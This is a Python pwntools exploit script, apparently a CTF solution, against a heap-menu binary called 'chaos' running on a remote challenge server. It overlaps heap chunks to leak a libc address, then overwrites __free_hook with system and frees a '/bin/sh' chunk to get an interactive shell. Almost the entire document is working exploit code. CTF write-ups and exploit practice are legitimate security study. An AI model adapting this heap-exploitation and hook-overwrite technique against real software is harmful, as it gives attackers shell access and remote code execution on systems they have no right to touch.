# -*- encoding: utf-8 -*-
import sys 
import os 
from pwn import * 
context.log_level = 'debug' 
#context.update( os = 'linux', arch = 'amd64',timeout = 1)
binary = './chaos'
os.system('chmod +x %s'%binary)
elf = ELF(binary)
libc = elf.libc
#libc = ELF('')
context.binary = binary
DEBUG = 0
if DEBUG:
    p = process(binary)
    libc = elf.libc
    #p = process(['qemu-arm', binary])
    #p = process(['qemu-arm', binary,'-g','1234'])
    #p = process(['qemu-aarch64','-L','','-g','1234',binary])
else:
    host = '8.134.37.86'
    port = '28128'
    p = remote(host,port)

l64 = lambda            : u64(p.recvuntil('\x7f')[-6:].ljust(8,'\x00'))
l32 = lambda            : u32(p.recvuntil('\xf7')[-4:].ljust(4,'\x00'))
sla = lambda a,b        : p.sendlineafter(str(a),str(b))
sa  = lambda a,b        : p.sendafter(str(a),str(b))
lg  = lambda name,data  : p.success(name + ': 0x%x' % data)
se  = lambda payload    : p.send(payload)
rl  = lambda            : p.recv()
sl  = lambda payload    : p.sendline(payload)
ru  = lambda a          : p.recvuntil(str(a))
rint= lambda x = 12     : int( p.recv(x) , 16)

def dbg( b = null):
    if (b == null):
        gdb.attach(p)
        pause()
    else:
        gdb.attach(p,'b %s'%b)

def exhaust( pwn ):
    global p
    i = 0
    while 1 :
        try:
            i+=1
            pwn()
        except:
            lg('times ======== > ',i)
            p.close()
            if (DEBUG):
                p = process(binary)
            else :
                p = remote(host,port)

def one_gadget(filename):
    log.progress('Leak One_Gadgets...')
    one_ggs = str(subprocess.check_output(
        ['one_gadget','--raw', '-f',filename]
    )).split(' ')
    return list(map(int,one_ggs))

def cmd(num):
    sla('>>>',num)

def add(size , content):
    cmd('passwd:Cr4at3 \nopcode:1\n')
    sla('>>> ' , size)
    sa('>>> ' , content)

def show(idx):
    cmd('passwd:SH0w \nopcode:2\n')
    sla('>>> ' , idx)

def edit(idx , content):
    cmd('passwd:Ed1t \nopcode:3\n')
    sla('>>> ' , idx)
    sa('>>> ' , content)

def delete(idx):
    cmd('passwd:D3l4te \nopcode:4\n')
    sla('>>> ' , idx)

# one_gad = one_gadget(libc.path)

# dbg('strchr')
add(0x208 , '\xff'*0x200 + p64(0x1000) )
add(0x208 , '\xff'*0x200 + p64(0x1000) )
add(0x208 , '\xff'*0x200 + p64(0x1000) )
add(0x208 , '\xff'*0x200 + p64(0x1000) )
add(0x208 , '\xff'*0x200 + p64(0x1000) )
add(0x208 , '\xff'*0x200 + p64(0x1000) )

# dbg('* $rebase(0x000000000000F9F)')
edit(5 , '\x00'*0x218 + flat(0x21 ,0,0,0, 0x220*5 + 0x20*4 + 1) )
delete(4)

for i in range(0x11):
    edit(0 , '\x00')

show(3)

__malloc_hook = l64() - 0x70
lg('__malloc_hook',__malloc_hook)
libc.address = __malloc_hook - libc.sym['__malloc_hook']
__free_hook = libc.sym['__free_hook']
system = libc.sym['system']
binsh = libc.search('/bin/sh\x00').next()

# 4c0

# dbg()
add(0x208 , '\x00'*0x200 + p64(0x1000) )
delete(1)

payload = '\x00'*0x200 + flat( 0x100 , __free_hook ,0, 0x21 , 0 , 0 , 0 ,0x221 , __free_hook - 8)

edit(1 , payload )

add(0x208 , 'a')
add(0x208 , flat('/bin/sh\x00' , system))
# dbg()

delete(0)

# dbg()


p.interactive()

'''
@File    :   chaos.py
@Time    :   2021/09/23 10:10:53
@Author  :   Niyah 
'''